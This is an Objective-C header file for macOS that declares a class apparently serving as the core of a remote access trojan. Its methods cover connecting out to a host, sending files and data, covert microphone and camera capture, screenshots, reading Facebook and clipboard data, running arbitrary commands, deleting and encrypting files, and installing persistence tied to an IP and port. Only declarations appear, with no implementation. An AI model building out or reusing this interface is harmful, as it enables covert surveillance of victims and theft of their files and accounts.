
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>
#include <arpa/inet.h>
#import "NSData+AESCrypt.h"
#import <Appkit/Appkit.h>
#import "escryptor.h"

@interface espl : NSObject {
    NSFileManager *fileManager;
}

@property (nonatomic,strong) AVCaptureSession *session;
@property (readwrite, retain) AVCaptureStillImageOutput *stillImageOutput;
@property (retain) AVAudioRecorder *soundRecorder;
@property (retain) NSFileManager *fileManager;
@property (retain) NSString *skey;
@property (retain) NSString *terminator;


//convenience
-(void)blank;
-(NSString *)forgetFirst:(NSArray*)args;

//socks
extern int sockfd;

-(int)connect:(NSString*)host
             :(long)port;
-(void)sendData:(NSData *)data;
-(void)sendString:(NSString *)string;

//mic
-(void)mic:(NSArray *)args;
-(void)initmic;
-(BOOL)stopAudio;
-(BOOL)recordAudio;

//camera
-(void)takePicture;
-(void)initcamera;
-(void)captureWithBlock:(void(^)(NSData* block))block;
-(void)stopcapture;
- (AVCaptureDevice *)getcapturedevice;

//file management
-(void)directoryList:(NSArray *)args;
-(void)download:(NSArray *)args;
-(void)rmFile:(NSArray *)args;
-(void)changeWD:(NSArray *)args;
-(void)receiveFile:(NSString *)saveToPath;
-(void)sendFile:(NSData *)fileData;
-(void)encryptFile:(NSArray *)args;
-(void)decryptFile:(NSArray *)args;

//misc
-(void)executeCMD:(NSArray *)args;
-(void)idleTime;
-(void)getPid;
-(void)getFacebook;
-(void)getPaste;
-(void)set_brightness:(NSArray *)args;
-(void)screenshot;
-(void)persistence:(NSString *)ip :(NSString *)port;
-(void)removePersistence:(NSString *)ip :(NSString *)port;
-(void)openURL:(NSArray *)cmdarray;
-(NSData *)GetMACAddress;
-(NSString *)GetMACAddressDisplayString;

@end
